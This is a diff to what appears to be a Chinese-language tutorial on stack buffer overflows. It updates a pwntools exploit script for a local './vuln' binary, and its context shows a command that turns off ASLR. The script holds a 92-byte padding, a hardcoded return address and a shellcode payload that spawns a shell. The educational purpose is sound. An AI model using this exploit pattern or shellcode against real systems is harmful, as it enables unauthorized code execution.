@@ -81,17 +81,20 @@ echo 0 > /proc/sys/kernel/randomize_va_space
 
 ```python
 from pwn import *
-#context.log_level='debug'
-p=process("./vuln") # 此处是程序的路径
-payload='a'*92	# 此处的92是第一步所确定的无效字符串的长度
-payload+=p32(0xffffcf80) #此处的地址是第二步时获得的 shellcode 地址
-#shellcode脚本
-payload+="\xeb\x11\x5e\x31\xc9\xb1\x32\x80"
-payload+="\x6c\x0e\xff\x01\x80\xe9\x01\x75"
-payload+="\xf6\xeb\x05\xe8\xea\xff\xff\xff"
-payload+="\x32\xc1\x51\x69\x30\x30\x74\x69"
-payload+="\x69\x30\x63\x6a\x6f\x8a\xe4\x51"
-payload+="\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"
+
+# context.log_level = 'debug'
+
+p = process("./vuln")
+
+payload = b'a' * 92
+
+payload += p32(0xffffd570)
+payload += b"\xeb\x11\x5e\x31\xc9\xb1\x32\x80"
+payload += b"\x6c\x0e\xff\x01\x80\xe9\x01\x75"
+payload += b"\xf6\xeb\x05\xe8\xea\xff\xff\xff"
+payload += b"\x32\xc1\x51\x69\x30\x30\x74\x69"
+payload += b"\x69\x30\x63\x6a\x6f\x8a\xe4\x51"
+payload += b"\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"
 
 p.send(payload)
 p.interactive()#返回交互式界面
